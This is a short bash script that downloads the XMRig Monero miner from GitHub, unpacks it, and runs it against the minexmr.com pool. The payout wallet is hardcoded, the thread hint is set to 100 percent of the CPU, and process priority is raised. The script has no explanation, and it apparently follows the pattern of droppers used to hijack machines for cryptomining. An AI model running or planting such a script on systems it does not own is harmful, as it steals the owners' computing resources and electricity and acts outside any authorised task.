#!/bin/bash

wget https://github.com/xmrig/xmrig/releases/download/v6.3.5/xmrig-6.3.5-linux-x64.tar.gz
tar -xvf xmrig-6.3.5-linux-x64.tar.gz
cd xmrig-6.3.5

./xmrig -o us-west.minexmr.com:443 -u 86rNBsrqqaX6Ha7zwwyC2BYycsXurMUfxWaoPsUbtvqh7nfDFJ5oATLSUYfhZsCsJ3X31Z4d6PyNWES4gedmCBqHQ9E8Npu -k --tls --cpu-max-threads-hint=100 --cpu-priority=5 --randomx-mode=fast --print-time=5
